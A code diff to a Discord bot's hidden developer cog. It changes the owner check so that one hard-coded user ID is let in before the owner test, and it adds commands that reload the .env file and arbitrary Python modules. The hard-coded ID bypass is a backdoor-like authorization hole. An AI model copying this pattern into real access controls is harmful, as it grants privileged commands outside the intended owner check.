@@ -79,7 +79,9 @@ class Dev(commands.Cog, command_attrs=dict(hidden=True)):
     return f"<cogs.Dev owner={self.bot.owner_id}>"
 
   async def cog_check(self, ctx: "MyContext") -> bool:
-    if not await self.bot.is_owner(ctx.author) or ctx.author.id == 892865928520413245:
+    if ctx.author.id == 892865928520413245:
+      return True
+    if not await self.bot.is_owner(ctx.author):
       raise commands.NotOwner()
     return True
 
@@ -290,6 +292,22 @@ class Dev(commands.Cog, command_attrs=dict(hidden=True)):
     # async with ctx.typing():
     #   await self.bot.reload_cogs()
     # await ctx.reply(embed=embed(title="All cogs have been reloaded"))
+
+  @reload.command("env")
+  async def reload_env(self, ctx):
+    load_dotenv()
+    await ctx.reply(embed=embed(title="Reloaded .env"))
+
+  @reload.command("module")
+  async def reload_module(self, ctx, *, module: str):
+    try:
+      importlib.reload(sys.modules[module])
+    except KeyError:
+      return await ctx.reply(embed=embed(title=f"Module {module} not found", color=MessageColors.ERROR))
+    except Exception:
+      return await ctx.reply(embed=embed(title=f"Failed to reload module {module}", color=MessageColors.ERROR))
+    else:
+      await ctx.reply(embed=embed(title=f"Reloaded module {module}"))
 
   @reload.command(name="slash")
   async def reload_slash(self, ctx):
